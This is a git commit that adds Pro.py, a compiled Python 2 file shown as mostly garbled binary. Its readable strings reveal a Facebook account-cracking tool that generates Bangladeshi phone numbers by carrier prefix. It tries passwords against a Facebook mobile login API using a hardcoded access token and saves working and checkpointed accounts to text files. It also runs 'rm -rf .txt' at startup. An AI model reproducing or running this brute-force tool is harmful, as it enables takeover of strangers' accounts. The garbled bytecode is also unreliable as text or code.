5b4c558e8992eb0d795a1c315bc4f37d57c8b424
aqa1982 <37027856+aqa1982@users.noreply.github.com>
2022-12-05 11:28:34 +0300

    Add files via upload

---
+++ Pro.py
@@ -0,0 +1,183 @@
+�
+g�bc
+
+@s
+
+�ddlZddlZddlZddlZddlZddlZddlZddlZddlZddl
+Z
+ddl
+Z
+ddlZej
+d�d�Z
+dZdZdZdZdZd
+Zd
+ZdZd
+ZdZej
+d
+�e
+ed�xJed�D] < Zejdd�Zedd�e_eGHejj�q
+WyddlZWnek
+rzej
+d�nXyddl
+Z
+Wn8ek
+r�ej
+d�ej!d�ej
+d�nXddl
+"m#Z#ddl$m%Z%ddl m&Z&ejd
+�e
+'e�ej(d�e j&�Z)e)j*e+�e)j,e j-j.�dd�d(ge)_/d�Z0d �Z
+d!�Z1d
+"�Z2d#eZ3d$Z4gZ5ga6ga7gZ8d%�Z9d&�Z:e;d'kr�e9�ndS()i����Nsrm -rf .txtcCsCx<|dD]0}tjj|�tjj�tjd�qWdS(Ns
+g
+{�G�z�?(tsyststdouttwritetflushttimetsleep(tzte((s / sdcard / old.pytpsb
+         s
+         s[0ms[0;30ms[0;31ms[0;32ms[0;33ms[0;34ms[0;35ms[0;36ms[0;37mtclears� >> PLEASE WAIT <<
+         FREE TOOL
+         Only Old Id Clone
+         AUTHOR: RIMON KHAN
+         Facebook: BLACK-BOY
+         Whatsapp: +8801 ** * 9 ** **
+         Process Starting
+         Wait 1 MnitiP�iG�i��s.txtt as pip2 install requestsspip2 install mechanizeis    python2 C(t
+         ThreadPool(tConnectionError(tBrowsertutf8tmax_times
+         user-agentsDalvik/ 1 .6.0 (Linux; U; Android 4.4.2; NX55 Build/ K OT5506) [FBAN / FB4A;
+FBAV / 106.0
+.0
+.26
+.68;
+FBBV / 45904160;
+FBDM / {density = 3.0, width = 1080, height = 1920};FBLC / it_IT;
+FBRV / 45904160;
+FBCR / PosteMobile;
+FBMF / asus;
+FBBD / asus;
+FBPN / com.facebook.katana;
+FBDV / ASUS_Z00AD;
+FBSV / 5.0;
+FBOP / 1;
+FBCA / x86: armeabi - v7a;]cCsHtjj�dS(N(tosRtexit(
+    ((s / sdcard / old.pytexb @ scCsCx < | dD]0}tjj | �tjj�tjd�qWdS(Ns
+g
+    ���Q��?(RRRRRR(RR((s / sdcard / old.pyREs
+    cCstjd�dS(Ni(RR(((s / sdcard / old.pyttLscCstjd�dS(NR    (Rtsystem(((s / sdcard / old.pytcbPss @ [1;92m
+
+
+/
+
+    $$$$$$$  /$$$$$$ /$$      /$$  /$$$$$$  /$$   /$
+    $
+| $$__ $$|_  $$ _ /| $$$ /$$$ /$$_ _  $$| $ $$ | $$
+| $
+    $  \ $$  | $$  | $$$$  / $$$ $| $$  \ $ $| $$$ $| $$
+| $$$$$$ $/  | $$  | $$ $ $ /$$ $ $| $$  | $ $| $$ $$ $$
+| $$__  $$  | $$  | $$  $$ $| $ $| $$  | $ $| $$  $$$$
+| $$  \ $$  | $$  | $$\  $ | $ $| $$  | $ $| $$\  $$$
+| $$  | $$ /$$$$$$ | $$ \ / | $$ | $$$$$$ / | $$ \  $$
+    | __ / | __ / | ______ / | __ / | __ /  \______ / | __ /   \__ /
+
+    icCsatjd�tGHddGHdGHdGHdGHdGHdGHd    GHd
+    GHdGHd GHd
+    GHddGHt�dS(NR    i2t-s[1;92ms[RANDOM ID COINING]ts *[ONLY BANGLADESHI ACCOUNTS ARE AVAILABLE]
+    s[1]  [1;96mGP[Problem]s[2]  [1;92mRobis[3]  [1;96mAirtels[4]  [1;92mBanglalinks[5]  [1;93mTeletalks[0]  [1;95mExit            s[1;92m-(RRtlogotaction(((s / sdcard / old.pytmainhs
+            cs�td�} | dkr  # Ht�n�|dkr�tjd�tGHddGHdGHdGHdGHyOtd��d�d	}x0t|d
+    �j�D]}tj | j	�    �q�WWq�t
+    k
+    r�dGHtd � | �q�Xn�| d
+k
+    r�tjd�tGHddGHdGHdGHdGHyOtd��d�d	}x0t | d
+�
+    j�D]}tj| j	��    q< W Wq�t
+k
+    r�
+    dGHtd� | � q�Xn4|d k r9tjd�tGHddGHdGHdGHdGHyOtd��d�d	}xt|d � j�
+    D]}tj|j �� q�    WWq�t
+k
+r5
+    
+    dGHtd�| � q �Xn�|dk r �tjd�tGHddGHdGHdGHdGHyOtd��d�d	}x0t|d � j�
+    D]}tj|j �� q�    WWq�t
+k
+r�
+    
+    dGHtd�| � q �Xn�|dk r �tjd�tGHddGHdGHdGHdGHyOtd��d�d	}x0t|d � j�
+    D]}tj|j �� qR    WWq�t
+k
+r�
+    
+    dGHtd�| � q �Xn|dk r �t�nHt�tt
+t� �
+    }td|� t jd�td�tjd�td�tjd�tdd�tjd�HddH��fd�}td�}|j|t � Hd d HHdtt
+t��d tt
+t��d
+    GHtd �tjd!�dS("Ns
+[1;91m ==
+    =>> Rt1 R	i2Rs/170    ,171 , 172 , 173, 174, 175, 176, 177, 178, 179s Choose Code  : s.ttrs[!] File Not Founds
+[ Back ]
+    t2s/180, 1 81, 182, 183, 184, 185, 186, 187, 188, 189s+880t3s/160,1 6 1, 1 62, 163, 164, 165, 166, 167, 168, 169t4s/190,1 9 1, 1 92, 193, 194, 195, 196, 197, 198, 199t5s/150,1 5 1, 1 52, 153, 154, 155, 156, 157, 158, 159t0s[✓] Total Numbers: g�?s)[✓] Ple
+        ase wait, process is running ...s+[!] To Stop Process Press CTRL Then Press zc	s�    |}y tjd�Wntk
+                                                                                                                                                                                                                                                            r*
+        nXyY��|}|dd!}|}tjd��|d|d�}tj|�}d|krd��|d	|d
+                                                                                                                                                                                                                                                            d
+                                                                                                                                                                                                                                                            GHtdd�}|j��|d
+                                                                                                                                                                                                                                                            |d�|j�t	j
+                                                                                                                                                                                                                                                            �||�nd|dkr�d��|d	|dGHtdd�}|j��|d
+                                                                                                                                                                                                                                                            |d�|j�tj
+                                                                                                                                                                                                                                                            �||�nWnnXdS(Ntsaveii s�https://b-api.facek.com/method/auth.login? a ess_toke n =237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s&locale=en_US&password=sH&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmtaccess_tokens [1;92m   [RIMON-OK]    [1;92m s  |  Rssave/successfull.txtR
+                                                                                                                                                                                                                                                            t|s
+                                                                                                                                                                                                                                                            swww.facebook.comt	error_msgs [1;92m   [RIMON]       [1;92m s[1;93m[0m ssave/checkpoint.txt(RtmkdirtOSErrortbrtopentjsontloadRtclosetokstappendtcpb(	targtusertresulttdigi6tpass1tdatatqtokbtcps(tctk(s/sdcard/old.pyR�s2
+
+                                                                                                                                                                                                                                                            '!!
+                                                                                                                                                                                                                                                            !
+                                                                                                                                                                                                                                                            is[✓] Total OK/CP : t/s2[✓] CP File Has Been Saved : save/checkpoint.txts
+                                                                                                                                                                                                                                                            [Press Enter To Go Back]spython2 old.py(t	raw_inputRRRRR)t	readlinestidR.tstriptIOErrorRtstrtlenRRRRtmapR-R/(tbchtidlisttlineRtxxxtp((R9R:s/sdcard/old.pyRzs�
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                                                                                                                                                                                                (
+                                                                                                                                                                                                                                                                                                                                                                                                t__main__(s
+                                                                                                                                                                                                                                                                                                                                                                                                user-agent
+sD a lvik
+/1.6 . 0
+(Linu x ; U; Androi d 4.4.2
+    ; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/    106.0.0.26 . 68;FBBV/4    904160;FBDM/{density=3.0    ,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FB
+PN/com.facebook.katana;FBDV/ \
+ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](<RRRt
+datetimetrandomthashlibtret	threadingR*turllibt	cookielibtgetpassRRt	color_offtblacktredtgreentyellowtbluetpurpletcyantwhitetrang e t n t r andinttnmbrR)RRt r equest s tImport E rrort mechanizeRtmultiprocessing.    p    o Rtrequests.exceptionsRR
+treloadtsetdefaultencodingR(tset_handle_robotstFalsetset_handle_refresht_httptHTTPRefreshProcessort
+addheadersRRRRtbackt
+successfulR/R-R>RRt__name__(((s/sdcard/old.pyt<module>
+sj�
+
+
+
+
+
+
+
+
+
+
+		�
+
+
+rimon
